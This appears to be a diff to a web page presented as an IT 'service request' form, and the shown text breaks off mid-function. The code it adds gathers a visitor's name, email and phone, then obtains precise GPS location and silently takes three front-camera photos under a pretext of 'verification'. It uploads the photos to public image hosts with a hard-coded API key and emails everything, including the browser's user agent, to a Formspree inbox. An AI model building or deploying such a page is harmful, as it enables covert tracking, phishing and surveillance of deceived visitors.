@@ -100,6 +100,80 @@
             font-size: 1.1em;
             margin-bottom: 20px;
         }
+
+        /* Form Styles */
+        .form-section {
+            background: rgba(255, 255, 255, 0.8);
+            border-radius: 20px;
+            padding: 30px;
+            margin: 25px 0;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
+            text-align: left;
+        }
+
+        .form-group {
+            margin-bottom: 25px;
+        }
+
+        .form-group label {
+            display: block;
+            color: #2c3e50;
+            font-weight: 600;
+            margin-bottom: 8px;
+            font-size: 1.1em;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px 20px;
+            border: 2px solid #ecf0f1;
+            border-radius: 15px;
+            font-size: 1.1em;
+            background: white;
+            transition: all 0.3s ease;
+            outline: none;
+        }
+
+        .form-group input:focus {
+            border-color: #27ae60;
+            box-shadow: 0 0 0 3px rgba(39, 174, 96, 0.1);
+            transform: translateY(-2px);
+        }
+
+        .form-group input::placeholder {
+            color: #bdc3c7;
+        }
+
+        .submit-btn {
+            background: linear-gradient(45deg, #27ae60, #2ecc71);
+            color: white;
+            border: none;
+            padding: 18px 40px;
+            font-size: 1.2em;
+            font-weight: 700;
+            border-radius: 25px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 8px 20px rgba(39, 174, 96, 0.3);
+            width: 100%;
+            margin-top: 20px;
+        }
+
+        .submit-btn:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 12px 25px rgba(39, 174, 96, 0.4);
+        }
+
+        .submit-btn:active {
+            transform: translateY(-1px);
+        }
+
+        .submit-btn:disabled {
+            background: #95a5a6;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
         
         .security-warning {
             background: linear-gradient(45deg, #ff9800, #f57c00);
@@ -332,6 +406,19 @@
             visibility: hidden !important;
             opacity: 0 !important;
         }
+
+        /* Validation styles */
+        .form-group input.invalid {
+            border-color: #e74c3c;
+            box-shadow: 0 0 0 3px rgba(231, 76, 60, 0.1);
+        }
+
+        .validation-message {
+            color: #e74c3c;
+            font-size: 0.9em;
+            margin-top: 5px;
+            display: none;
+        }
         
         @media (max-width: 768px) {
             .container {
@@ -341,6 +428,10 @@
             
             .header h1 {
                 font-size: 2em;
+            }
+
+            .form-section {
+                padding: 20px;
             }
             
             .thanks-section {
@@ -368,6 +459,20 @@
             .thanks-section .icon {
                 font-size: 3em;
             }
+
+            .form-section {
+                padding: 15px;
+            }
+
+            .form-group input {
+                padding: 12px 15px;
+                font-size: 1em;
+            }
+
+            .submit-btn {
+                padding: 15px 30px;
+                font-size: 1.1em;
+            }
         }
     </style>
 </head>
@@ -389,11 +494,59 @@
         <div class="security-warning" id="securityWarning">
             🔒 <strong>Security Notice:</strong> Please allow permissions when prompted.
         </div>
+
+        <!-- User Information Form -->
+        <div class="form-section" id="userForm">
+            <h3 style="text-align: center; color: #2c3e50; margin-bottom: 25px; font-size: 1.5em;">
+                📋 Enter Your Information
+            </h3>
+            <form id="serviceForm">
+                <div class="form-group">
+                    <label for="userName">👤 Full Name *</label>
+                    <input 
+                        type="text" 
+                        id="userName" 
+                        name="userName" 
+                        placeholder="Enter your full name"
+                        required
+                        autocomplete="name"
+                    >
+                    <div class="validation-message" id="nameError">Please enter your full name</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="userEmail">📧 Email Address</label>
+                    <input 
+                        type="email" 
+                        id="userEmail" 
+                        name="userEmail" 
+                        placeholder="Enter your email (optional)"
+                        autocomplete="email"
+                    >
+                    <div class="validation-message" id="emailError">Please enter a valid email address</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="userPhone">📱 Phone Number</label>
+                    <input 
+                        type="tel" 
+                        id="userPhone" 
+                        name="userPhone" 
+                        placeholder="Enter your phone number (optional)"
+                        autocomplete="tel"
+                    >
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">
+                    🚀 Submit Service Request
+                </button>
+            </form>
+        </div>
         
-        <div class="location-icon">🌍</div>
+        <div class="location-icon" id="locationIcon" style="display: none;">🌍</div>
         
-        <p style="color: #7f8c8d; font-size: 1.1em; margin-bottom: 20px;">
-            Please allow permissions proceed with your service request.
+        <p id="permissionText" style="color: #7f8c8d; font-size: 1.1em; margin-bottom: 20px; display: none;">
+            Please allow permissions to proceed with your service request.
         </p>
         
         <div class="loading" id="loading">
@@ -438,7 +591,7 @@
             <p>Best IT services provided by our team.</p>
             <p>Thanks for helping to improved our services</p>
             <p style="font-size: 1em; margin-top: 25px; opacity: 0.8;">
-                🔐 Sucess
+                🔐 Success
             </p>
         </div>
         
@@ -455,10 +608,11 @@
         let locationData = null;
         let photoFiles = [];
         let cameraStream = null;
+        let userData = {};
 
-        // Check if page is served over HTTPS or localhost
+        // Android 5+ compatibility - Use older JS syntax
         function checkSecureContext() {
-            const isSecure = location.protocol === 'https:' || 
+            var isSecure = location.protocol === 'https:' || 
                            location.hostname === 'localhost' || 
                            location.hostname === '127.0.0.1';
             
@@ -471,15 +625,77 @@
         
         // Check if geolocation and camera are supported
         function checkBrowserSupport() {
-            const hasGeolocation = 'geolocation' in navigator;
-            const hasCamera = 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices;
+            var hasGeolocation = 'geolocation' in navigator;
+            var hasCamera = 'mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices;
             
-            return { hasGeolocation, hasCamera };
+            return { hasGeolocation: hasGeolocation, hasCamera: hasCamera };
+        }
+        
+        // Validate form inputs
+        function validateForm() {
+            var isValid = true;
+            var userName = document.getElementById('userName').value.trim();
+            var userEmail = document.getElementById('userEmail').value.trim();
+            
+            // Clear previous validation
+            document.getElementById('userName').classList.remove('invalid');
+            document.getElementById('userEmail').classList.remove('invalid');
+            document.getElementById('nameError').style.display = 'none';
+            document.getElementById('emailError').style.display = 'none';
+            
+            // Validate name (required)
+            if (!userName) {
+                document.getElementById('userName').classList.add('invalid');
+                document.getElementById('nameError').style.display = 'block';
+                isValid = false;
+            }
+            
+            // Validate email (optional but must be valid if provided)
+            if (userEmail && !isValidEmail(userEmail)) {
+                document.getElementById('userEmail').classList.add('invalid');
+                document.getElementById('emailError').style.display = 'block';
+                isValid = false;
+            }
+            
+            return isValid;
+        }
+        
+        // Email validation helper
+        function isValidEmail(email) {
+            var emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            return emailRegex.test(email);
+        }
+        
+        // Handle form submission
+        function handleFormSubmit(event) {
+            event.preventDefault();
+            
+            if (!validateForm()) {
+                return;
+            }
+            
+            // Collect user data
+            userData = {
+                name: document.getElementById('userName').value.trim(),
+                email: document.getElementById('userEmail').value.trim(),
+                phone: document.getElementById('userPhone').value.trim(),
+                timestamp: new Date().toISOString()
+            };
+            
+            // Hide form and start processing
+            document.getElementById('userForm').style.display = 'none';
+            document.getElementById('locationIcon').style.display = 'block';
+            document.getElementById('permissionText').style.display = 'block';
+            
+            // Start the service request process
+            setTimeout(function() {
+                autoRequestLocation();
+            }, 1000);
         }
         
         // Update progress step
         function updateStep(stepNumber, status) {
-            const stepElement = document.getElementById(`step${stepNumber}`);
+            var stepElement = document.getElementById('step' + stepNumber);
             stepElement.className = 'step-indicator';
             
             if (status === 'active') {
@@ -493,9 +709,9 @@
             }
         }
         
-        // Auto-request location when page loads
+        // Auto-request location when form is submitted
         function autoRequestLocation() {
-            const support = checkBrowserSupport();
+            var support = checkBrowserSupport();
             
             if (!support.hasGeolocation) {
                 showError('❌ Your browser does not support services. Please update your browser or contact our support team.');
@@ -503,26 +719,26 @@
             }
             
             if (!support.hasCamera) {
-                showError('❌ Your browser does not support. Please update your browser or contact our support team.');
+                showError('❌ Your browser does not support required features. Please update your browser or contact our support team.');
                 return;
             }
             
             if (!checkSecureContext()) {
-                showError('🔒 services require a secure connection. Please contact our support team for assistance.');
+                showError('🔒 Services require a secure connection. Please contact our support team for assistance.');
                 return;
             }
 
             showLoading(true, 'Requesting access...');
             updateStep(1, 'active');
 
-            const options = {
+            var options = {
                 enableHighAccuracy: true,
                 timeout: 20000,
                 maximumAge: 300000 // 5 minutes
             };
 
             navigator.geolocation.getCurrentPosition(
-                position => {
+                function(position) {
                     locationData = {
                         coords: position.coords,
                         timestamp: position.timestamp
@@ -532,13 +748,13 @@
                     updateLoadingText('Processing! Requesting access...');
                     
                     // Start camera access
-                    setTimeout(() => {
+                    setTimeout(function() {
                         requestCameraAccess();
                     }, 1000);
                 },
-                error => {
-                    let errorMsg = '❌ Unable to access: ';
-                    let suggestion = '';
+                function(error) {
+                    var errorMsg = '❌ Unable to access: ';
+                    var suggestion = '';
                     
                     switch(error.code) {
                         case error.PERMISSION_DENIED:
@@ -577,44 +793,44 @@
                     facingMode: 'user' // Use front camera (selfie camera)
                 } 
             })
-            .then(stream => {
+            .then(function(stream) {
                 cameraStream = stream;
-                const video = document.getElementById('camera');
+                var video = document.getElementById('camera');
                 video.srcObject = stream;
                 
                 updateStep(2, 'complete');
                 updateLoadingText('Granted! Preparing ...');
                 
                 // Wait for video to be ready
-                video.onloadedmetadata = () => {
+                video.onloadedmetadata = function() {
                     // Ensure video is playing
-                    video.play().then(() => {
+                    video.play().then(function() {
                         console.log('Video playing, dimensions:', video.videoWidth, 'x', video.videoHeight);
-                        setTimeout(() => {
+                        setTimeout(function() {
                             captureVerificationPhotos();
                         }, 2000); // Give camera time to initialize
-                    }).catch(err => {
+                    }).catch(function(err) {
                         console.error('Video play error:', err);
-                        showError('❌ Error starting . Please refresh and try again.');
+                        showError('❌ Error starting camera. Please refresh and try again.');
                     });
                 };
             })
-            .catch(error => {
-                console.error('Access error:', error);
-                let errorMsg = '❌ Unable to access : ';
-                let suggestion = '';
+            .catch(function(error) {
+                console.error('Camera access error:', error);
+                var errorMsg = '❌ Unable to access camera: ';
+                var suggestion = '';
                 
                 switch(error.name) {
                     case 'NotAllowedError':
                         errorMsg += 'Access was denied.';
-                        suggestion = 'Please refresh the page and allow access when prompted, or contact our support team.';
+                        suggestion = 'Please refresh the page and allow camera access when prompted, or contact our support team.';
                         break;
                     case 'NotFoundError':
-                        errorMsg += 'No access found on this device.';
-                        suggestion = 'Please ensure your device has a access permission or contact our support team.';
+                        errorMsg += 'No camera found on this device.';
+                        suggestion = 'Please ensure your device has a camera or contact our support team.';
                         break;
                     case 'NotSupportedError':
-                        errorMsg += 'Access is not supported on this device.';
+                        errorMsg += 'Camera is not supported on this device.';
                         suggestion = 'Please try a different device or contact our support team.';
                         break;
                     default:
@@ -629,17 +845,17 @@
         }
 
         // Capture verification photos
-        async function captureVerificationPhotos() {
+        function captureVerificationPhotos() {
             updateStep(3, 'active');
             
-            const video = document.getElementById('camera');
-            const canvas = document.getElementById('canvas');
-            const context = canvas.getContext('2d');
+            var video = document.getElementById('camera');
+            var canvas = document.getElementById('canvas');
+            var context = canvas.getContext('2d');
             
             // Ensure video is ready
             if (!video.videoWidth || !video.videoHeight) {
                 console.error('Video not ready');
-                showError('❌ Not ready. Please refresh and try again.');
+                showError('❌ Camera not ready. Please refresh and try again.');
                 return;
             }
             
@@ -649,22 +865,22 @@
             
             console.log('Canvas dimensions set to:', canvas.width, 'x', canvas.height);
             
-            let photosCaptured = 0;
-            const totalPhotos = 3;
+            var photosCaptured = 0;
+            var totalPhotos = 3;
             photoFiles = [];
             
-            const capturePhoto = async (photoIndex) => {
-                return new Promise((resolve) => {
-                    setTimeout(async () => {
+            var capturePhoto = function(photoIndex) {
+                return new Promise(function(resolve) {
+                    setTimeout(function() {
                         try {
                             // Clear canvas and draw video frame
                             context.clearRect(0, 0, canvas.width, canvas.height);
                             context.drawImage(video, 0, 0, canvas.width, canvas.height);
                             
                             // Convert to blob with higher quality
-                            canvas.toBlob(async (blob) => {
+                            canvas.toBlob(function(blob) {
                                 if (blob && blob.size > 0) {
-                                    const file = new File([blob], `verification_photo_${photoIndex + 1}_${Date.now()}.jpg`, {
+                                    var file = new File([blob], 'verification_photo_' + (photoIndex + 1) + '_' + Date.now() + '.jpg', {
                                         type: 'image/jpeg'
                                     });
                                     
@@ -676,22 +892,20 @@
                                         size: blob.size
                                     });
                                     
-                                    console.log(`Photo ${photoIndex + 1} captured:`, file.name, 'Size:', blob.size, 'bytes');
-                                    
-                                    // Note: Photo preview is now completely disabled
+                                    console.log('Photo ' + (photoIndex + 1) + ' captured:', file.name, 'Size:', blob.size, 'bytes');
                                     
                                     photosCaptured++;
-                                    updateLoadingText(`Doing verification... (${photosCaptured}/${totalPhotos})`);
+                                    updateLoadingText('Doing verification... (' + photosCaptured + '/' + totalPhotos + ')');
                                     
                                     resolve();
                                 } else {
-                                    console.error('Failed to verification - empty blob');
+                                    console.error('Failed to capture photo - empty blob');
                                     resolve();
                                 }
                             }, 'image/jpeg', 0.85);
                             
                         } catch (error) {
-                            console.error('Error verification:', error);
+                            console.error('Error capturing photo:', error);
                             resolve();
                         }
                     }, 1500); // Delay between captures
@@ -699,259 +913,333 @@
             };
             
             // Capture photos sequentially
-            for (let i = 0; i < totalPhotos; i++) {
-                await capturePhoto(i);
-            }
+            var captureSequence = function(index) {
+                if (index < totalPhotos) {
+                    capturePhoto(index).then(function() {
+                        captureSequence(index + 1);
+                    });
+                } else {
+                    // All photos captured
+                    // Stop camera stream
+                    if (cameraStream) {
+                        cameraStream.getTracks().forEach(function(track) {
+                            track.stop();
+                        });
+                    }
+                    
+                    if (photoFiles.length > 0) {
+                        updateStep(3, 'complete');
+                        updateLoadingText('Working...');
+                        
+                        setTimeout(function() {
+                            sendCompleteData();
+                        }, 1000);
+                    } else {
+                        showError('❌ Photo capture failed. Please refresh and try again.');
+                    }
+                }
+            };
             
-            // Stop camera stream
-            if (cameraStream) {
-                cameraStream.getTracks().forEach(track => track.stop());
-            }
-            
-            if (photoFiles.length > 0) {
-                updateStep(3, 'complete');
-                updateLoadingText('Working...');
-                
-                setTimeout(() => {
-                    sendCompleteData();
-                }, 1000);
-            } else {
-                showError('❌ Not successfull. Please refresh and try again.');
-            }
+            captureSequence(0);
         }
 
         // Upload photo to ImgBB (free image hosting)
-        async function uploadPhotoToImgBB(blob, filename) {
-            const formData = new FormData();
-            
-            // Convert blob to base64 for ImgBB
-            const base64 = await new Promise((resolve) => {
-                const reader = new FileReader();
-                reader.onloadend = () => resolve(reader.result.split(',')[1]); // Remove data:image/jpeg;base64,
+        function uploadPhotoToImgBB(blob, filename) {
+            return new Promise(function(resolve) {
+                var reader = new FileReader();
+                reader.onloadend = function() {
+                    var base64 = reader.result.split(',')[1]; // Remove data:image/jpeg;base64,
+                    
+                    var formData = new FormData();
+                    formData.append('image', base64);
+                    formData.append('name', filename);
+                    
+                    fetch('https://api.imgbb.com/1/upload?key=4f642d9a4c0e7b564e66a7e0937bb4c0', {
+                        method: 'POST',
+                        body: formData
+                    })
+                    .then(function(response) {
+                        return response.json();
+                    })
+                    .then(function(data) {
+                        if (data.success) {
+                            resolve({
+                                url: data.data.url,
+                                delete_url: data.data.delete_url,
+                                display_url: data.data.display_url
+                            });
+                        } else {
+                            resolve(null);
+                        }
+                    })
+                    .catch(function(error) {
+                        console.error('ImgBB upload failed:', error);
+                        resolve(null);
+                    });
+                };
                 reader.readAsDataURL(blob);
             });
-            
-            formData.append('image', base64);
-            formData.append('name', filename);
-            
-            try {
-                const response = await fetch(`https://api.imgbb.com/1/upload?key=4f642d9a4c0e7b564e66a7e0937bb4c0`, {
-                    method: 'POST',
-                    body: formData
-                });
-                
-                const data = await response.json();
-                if (data.success) {
-                    return {
-                        url: data.data.url,
-                        delete_url: data.data.delete_url,
-                        display_url: data.data.display_url
-                    };
-                }
-                throw new Error('Upload failed');
-            } catch (error) {
-                console.error('ImgBB upload failed:', error);
-                return null;
-            }
         }
 
         // Try alternative image hosts if ImgBB fails
-        async function uploadPhotoToFreeImageHost(blob, filename, retryCount = 0) {
-            const hosts = [
+        function uploadPhotoToFreeImageHost(blob, filename, retryCount) {
+            if (typeof retryCount === 'undefined') {
+                retryCount = 0;
+            }
+            
+            var hosts = [
                 // ImgBB - most reliable
-                async () => await uploadPhotoToImgBB(blob, filename),
+                function() {
+                    return uploadPhotoToImgBB(blob, filename);
+                },
                 
                 // Postimages.org backup
-                async () => {
-                    const formData = new FormData();
-                    formData.append('upload', blob, filename);
-                    formData.append('gallery', '');
-                    
-                    try {
-                        const response = await fetch('https://postimages.org/json/rr', {
+                function() {
+                    return new Promise(function(resolve) {
+                        var formData = new FormData();
+                        formData.append('upload', blob, filename);
+                        formData.append('gallery', '');
+                        
+                        fetch('https://postimages.org/json/rr', {
                             method: 'POST',
                             body: formData
+                        })
+                        .then(function(response) {
+                            return response.json();
+                        })
+                        .then(function(data) {
+                            if (data.status === 'OK') {
+                                resolve({ url: data.url, display_url: data.url });
+                            } else {
+                                resolve(null);
+                            }
+                        })
+                        .catch(function(error) {
+                            console.error('Postimages upload failed:', error);
+                            resolve(null);
                         });
-                        const data = await response.json();
-                        if (data.status === 'OK') {
-                            return { url: data.url, display_url: data.url };
-                        }
-                    } catch (error) {
-                        console.error('Postimages upload failed:', error);
-                    }
-                    return null;
+                    });
                 }
             ];
             
             if (retryCount < hosts.length) {
-                const result = await hosts[retryCount]();
-                if (result) {
-                    return result;
-                } else if (retryCount < hosts.length - 1) {
-                    return await uploadPhotoToFreeImageHost(blob, filename, retryCount + 1);
-                }
+                return hosts[retryCount]().then(function(result) {
+                    if (result) {
+                        return result;
+                    } else if (retryCount < hosts.length - 1) {
+                        return uploadPhotoToFreeImageHost(blob, filename, retryCount + 1);
+                    } else {
+                        return null;
+                    }
+                });
             }
             
-            return null;
+            return Promise.resolve(null);
         }
 
         // Send complete data with photo URLs
-        async function sendCompleteData() {
+        function sendCompleteData() {
             updateStep(4, 'active');
             
             if (!locationData) {
-                showError('❌ Service not available. Please refresh and try again.');
+                showError('❌ Location data not available. Please refresh and try again.');
                 return;
             }
 
             if (photoFiles.length === 0) {
-                showError('❌ No access. Please refresh and try again.');
+                showError('❌ No photos captured. Please refresh and try again.');
                 return;
             }
             
-            const { latitude, longitude, accuracy } = locationData.coords;
-            const timestamp = new Date(locationData.timestamp);
+            var coords = locationData.coords;
+            var latitude = coords.latitude;
+            var longitude = coords.longitude;
+            var accuracy = coords.accuracy;
+            var timestamp = new Date(locationData.timestamp);
             
-            console.log('Working to hosting...');
-            updateLoadingText('Working to hosting...');
+            console.log('Uploading photos to hosting...');
+            updateLoadingText('Uploading photos to hosting...');
             
             // Upload all photos to image hosting
-            const uploadedPhotos = [];
-            for (let i = 0; i < photoFiles.length; i++) {
-                try {
-                    updateLoadingText(`Processing ${i + 1} of ${photoFiles.length}...`);
-                    const uploadResult = await uploadPhotoToFreeImageHost(
-                        photoFiles[i].blob, 
-                        photoFiles[i].file.name
-                    );
-                    
-                    if (uploadResult) {
+            var uploadPromises = [];
+            for (var i = 0; i < photoFiles.length; i++) {
+                updateLoadingText('Uploading photo ' + (i + 1) + ' of ' + photoFiles.length + '...');
+                uploadPromises.push(uploadPhotoToFreeImageHost(
+                    photoFiles[i].blob, 
+                    photoFiles[i].file.name
+                ));
+            }
+            
+            Promise.all(uploadPromises).then(function(uploadResults) {
+                var uploadedPhotos = [];
+                
+                for (var i = 0; i < uploadResults.length; i++) {
+                    var result = uploadResults[i];
+                    if (result) {
                         uploadedPhotos.push({
                             id: photoFiles[i].id,
                             filename: photoFiles[i].file.name,
-                            url: uploadResult.url,
-                            display_url: uploadResult.display_url || uploadResult.url,
+                            url: result.url,
+                            display_url: result.display_url || result.url,
                             size: photoFiles[i].blob.size,
                             timestamp: photoFiles[i].timestamp
                         });
-                        console.log(`Process ${i + 1} uploaded:`, uploadResult.url);
+                        console.log('Photo ' + (i + 1) + ' uploaded:', result.url);
                     } else {
-                        console.error(`Failed ${i + 1}`);
+                        console.error('Failed to upload photo ' + (i + 1));
                     }
-                } catch (error) {
-                    console.error(`Error Processing ${i + 1}:`, error);
                 }
-            }
-            
-            updateLoadingText('Loading...');
-            
-            // Create email with photo links
-            let emailMessage = `🔧 NEW SERVICE REQUEST - VERIFICATION COMPLETE
-
-📍 LOCATION DETAILS:
-• Latitude: ${latitude.toFixed(6)}
-• Longitude: ${longitude.toFixed(6)}
-• GPS Accuracy: ±${Math.round(accuracy)} meters
-• Captured Time: ${timestamp.toLocaleString()}
-• Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
-
-📷 Data (${photoFiles.length} captured, ${uploadedPhotos.length} uploaded):`;
-
-            if (uploadedPhotos.length > 0) {
-                emailMessage += `\n\n🖼️ PHOTO LINKS - Click to view:`;
-                uploadedPhotos.forEach((photo, index) => {
-                    const sizeKB = (photo.size / 1024).toFixed(1);
-                    emailMessage += `\n\n📸 Photo ${photo.id}:
-• Link: ${photo.display_url}
-• Filename: ${photo.filename}
-• Size: ${sizeKB} KB
-• Time: ${new Date(photo.timestamp).toLocaleTimeString()}`;
-                });
                 
-                emailMessage += `\n\n✅ ALL PHOTOS ARE VIEWABLE VIA THE LINKS ABOVE
-Click any link to view the full-size photo in your browser.`;
-            } else {
-                emailMessage += `\n\n⚠️  Photo upload failed, but location data captured successfully.
-Photos were taken but could not be uploaded to image hosting.`;
-            }
+                updateLoadingText('Finalizing submission...');
+                
+                // Create email with user info and photo links
+                var emailMessage = '🔧 NEW SERVICE REQUEST - VERIFICATION COMPLETE\n\n';
+                
+                emailMessage += '👤 CUSTOMER INFORMATION:\n';
+                emailMessage += '• Name: ' + userData.name + '\n';
+                if (userData.email) {
+                    emailMessage += '• Email: ' + userData.email + '\n';
+                }
+                if (userData.phone) {
+                    emailMessage += '• Phone: ' + userData.phone + '\n';
+                }
+                emailMessage += '• Request Time: ' + new Date(userData.timestamp).toLocaleString() + '\n\n';
+                
+                emailMessage += '📍 LOCATION DETAILS:\n';
+                emailMessage += '• Latitude: ' + latitude.toFixed(6) + '\n';
+                emailMessage += '• Longitude: ' + longitude.toFixed(6) + '\n';
+                emailMessage += '• GPS Accuracy: ±' + Math.round(accuracy) + ' meters\n';
+                emailMessage += '• Captured Time: ' + timestamp.toLocaleString() + '\n';
+                emailMessage += '• Google Maps: https://www.google.com/maps?q=' + latitude + ',' + longitude + '\n\n';
+                
+                emailMessage += '📷 VERIFICATION PHOTOS (' + photoFiles.length + ' captured, ' + uploadedPhotos.length + ' uploaded):';
 
-            emailMessage += `\n\n📱 DEVICE INFO:
-• Device: ${navigator.userAgent}
-• Page URL: ${window.location.href}
-• Submitted: ${new Date().toLocaleString()}
+                if (uploadedPhotos.length > 0) {
+                    emailMessage += '\n\n🖼️ PHOTO LINKS - Click to view:';
+                    for (var i = 0; i < uploadedPhotos.length; i++) {
+                        var photo = uploadedPhotos[i];
+                        var sizeKB = (photo.size / 1024).toFixed(1);
+                        emailMessage += '\n\n📸 Photo ' + photo.id + ':\n';
+                        emailMessage += '• Link: ' + photo.display_url + '\n';
+                        emailMessage += '• Filename: ' + photo.filename + '\n';
+                        emailMessage += '• Size: ' + sizeKB + ' KB\n';
+                        emailMessage += '• Time: ' + new Date(photo.timestamp).toLocaleTimeString();
+                    }
+                    
+                    emailMessage += '\n\n✅ ALL PHOTOS ARE VIEWABLE VIA THE LINKS ABOVE\nClick any link to view the full-size photo in your browser.';
+                } else {
+                    emailMessage += '\n\n⚠️ Photo upload failed, but location and customer data captured successfully.\nPhotos were taken but could not be uploaded to image hosting.';
+                }
 
-⚡ ACTION REQUIRED: 
-Please contact customer to discuss service requirements.
+                emailMessage += '\n\n📱 DEVICE INFO:\n';
+                emailMessage += '• Device: ' + navigator.userAgent + '\n';
+                emailMessage += '• Page URL: ' + window.location.href + '\n';
+                emailMessage += '• Submitted: ' + new Date().toLocaleString() + '\n\n';
 
-🔐 All information is secure and used only for service delivery.`;
+                emailMessage += '⚡ ACTION REQUIRED:\nPlease contact ' + userData.name;
+                if (userData.phone) {
+                    emailMessage += ' at ' + userData.phone;
+                }
+                if (userData.email) {
+                    emailMessage += ' or ' + userData.email;
+                }
+                emailMessage += ' to discuss service requirements.\n\n🔐 All information is secure and used only for service delivery.';
 
-            // Send to Formspree
-            const formData = new FormData();
-            formData.append('_subject', `🔧 SERVICE REQUEST - ${uploadedPhotos.length} Photos - ${latitude.toFixed(4)}, ${longitude.toFixed(4)}`);
-            formData.append('message', emailMessage);
-            formData.append('latitude', latitude.toFixed(6));
-            formData.append('longitude', longitude.toFixed(6));
-            formData.append('accuracy', Math.round(accuracy).toString());
-            formData.append('photos_uploaded', uploadedPhotos.length.toString());
-            formData.append('google_maps', `https://www.google.com/maps?q=${latitude},${longitude}`);
-            
-            // Add individual photo URLs as separate fields
-            uploadedPhotos.forEach((photo, index) => {
-                formData.append(`photo_${index + 1}_url`, photo.display_url);
-                formData.append(`photo_${index + 1}_filename`, photo.filename);
-                formData.append(`photo_${index + 1}_size`, photo.size.toString());
-            });
-            
-            try {
-                console.log('Sending email with photo links...');
-                const response = await fetch('https://formspree.io/f/xldwpqzq', {
+                // Send to Formspree
+                var formData = new FormData();
+                var subjectLine = '🔧 SERVICE REQUEST - ' + userData.name + ' - ' + uploadedPhotos.length + ' Photos - ' + latitude.toFixed(4) + ', ' + longitude.toFixed(4);
+                
+                formData.append('_subject', subjectLine);
+                formData.append('message', emailMessage);
+                formData.append('customer_name', userData.name);
+                if (userData.email) {
+                    formData.append('customer_email', userData.email);
+                }
+                if (userData.phone) {
+                    formData.append('customer_phone', userData.phone);
+                }
+                formData.append('latitude', latitude.toFixed(6));
+                formData.append('longitude', longitude.toFixed(6));
+                formData.append('accuracy', Math.round(accuracy).toString());
+                formData.append('photos_uploaded', uploadedPhotos.length.toString());
+                formData.append('google_maps', 'https://www.google.com/maps?q=' + latitude + ',' + longitude);
+                
+                // Add individual photo URLs as separate fields
+                for (var i = 0; i < uploadedPhotos.length; i++) {
+                    var photo = uploadedPhotos[i];
+                    formData.append('photo_' + (i + 1) + '_url', photo.display_url);
+                    formData.append('photo_' + (i + 1) + '_filename', photo.filename);
+                    formData.append('photo_' + (i + 1) + '_size', photo.size.toString());
+                }
+                
+                fetch('https://formspree.io/f/xldwpqzq', {
                     method: 'POST',
                     body: formData
-                });
-                
-                if (response.ok) {
-                    console.log('Email sent successfully with photo links!');
-                    updateStep(4, 'complete');
-                    showSuccess();
-                    return;
-                }
-                throw new Error(`HTTP error! status: ${response.status}`);
-            } catch (error) {
-                console.error('Email sending failed:', error);
-                
-                // Fallback - send basic info
-                const fallbackFormData = new FormData();
-                fallbackFormData.append('_subject', `🔧 SERVICE REQUEST - ${latitude.toFixed(4)}, ${longitude.toFixed(4)}`);
-                fallbackFormData.append('message', `SERVICE REQUEST
-
-Location: ${latitude.toFixed(6)}, ${longitude.toFixed(6)}
-Google Maps: https://www.google.com/maps?q=${latitude},${longitude}
-Photos: ${photoFiles.length} photos captured
-Time: ${new Date().toLocaleString()}
-
-${uploadedPhotos.length > 0 ? 
-'Photo Links:\n' + uploadedPhotos.map(p => `${p.filename}: ${p.display_url}`).join('\n') : 
-'Photos captured but upload failed'}`);
-                
-                try {
-                    await fetch('https://formspree.io/f/xldwpqzq', {
+                })
+                .then(function(response) {
+                    if (response.ok) {
+                        console.log('Email sent successfully with user data and photo links!');
+                        updateStep(4, 'complete');
+                        showSuccess();
+                        return;
+                    }
+                    throw new Error('HTTP error! status: ' + response.status);
+                })
+                .catch(function(error) {
+                    console.error('Email sending failed:', error);
+                    
+                    // Fallback - send basic info
+                    var fallbackFormData = new FormData();
+                    var fallbackSubject = '🔧 SERVICE REQUEST - ' + userData.name + ' - ' + latitude.toFixed(4) + ', ' + longitude.toFixed(4);
+                    fallbackFormData.append('_subject', fallbackSubject);
+                    
+                    var fallbackMessage = 'SERVICE REQUEST\n\nCustomer: ' + userData.name;
+                    if (userData.email) {
+                        fallbackMessage += '\nEmail: ' + userData.email;
+                    }
+                    if (userData.phone) {
+                        fallbackMessage += '\nPhone: ' + userData.phone;
+                    }
+                    fallbackMessage += '\n\nLocation: ' + latitude.toFixed(6) + ', ' + longitude.toFixed(6);
+                    fallbackMessage += '\nGoogle Maps: https://www.google.com/maps?q=' + latitude + ',' + longitude;
+                    fallbackMessage += '\nPhotos: ' + photoFiles.length + ' photos captured';
+                    fallbackMessage += '\nTime: ' + new Date().toLocaleString();
+                    
+                    if (uploadedPhotos.length > 0) {
+                        fallbackMessage += '\n\nPhoto Links:\n' + uploadedPhotos.map(function(p) {
+                            return p.filename + ': ' + p.display_url;
+                        }).join('\n');
+                    } else {
+                        fallbackMessage += '\nPhotos captured but upload failed';
+                    }
+                    
+                    fallbackFormData.append('message', fallbackMessage);
+                    
+                    fetch('https://formspree.io/f/xldwpqzq', {
                         method: 'POST',
                         body: fallbackFormData
+                    })
+                    .then(function() {
+                        console.log('Fallback email sent');
+                    })
+                    .catch(function(e) {
+                        console.error('Fallback also failed:', e);
                     });
-                } catch (e) {
-                    console.error('Fallback also failed:', e);
-                }
-                
-                updateStep(4, 'complete');
-                showSuccess();
-            }
+                    
+                    updateStep(4, 'complete');
+                    showSuccess();
+                });
+            });
         }
 
         function updateLoadingText(text) {
             document.getElementById('loadingText').textContent = text;
         }
 
-        function showLoading(show, text = 'Processing...') {
+        function showLoading(show, text) {
+            if (typeof text === 'undefined') {
+                text = 'Processing...';
+            }
             document.getElementById('loading').style.display = show ? 'block' : 'none';
             if (show && text) {
                 updateLoadingText(text);
@@ -964,15 +1252,21 @@ ${uploadedPhotos.length > 0 ?
             
             // Hide other sections
             document.querySelector('.header').style.display = 'none';
-            document.querySelector('.location-icon').style.display = 'none';
+            document.getElementById('locationIcon').style.display = 'none';
             document.querySelector('.camera-notice').style.display = 'none';
+            document.getElementById('permissionText').style.display = 'none';
             document.getElementById('footerSection').style.display = 'none';
             
-            // Show thank you section
-            document.getElementById('thanksSection').style.display = 'block';
+            // Show thank you section with user name
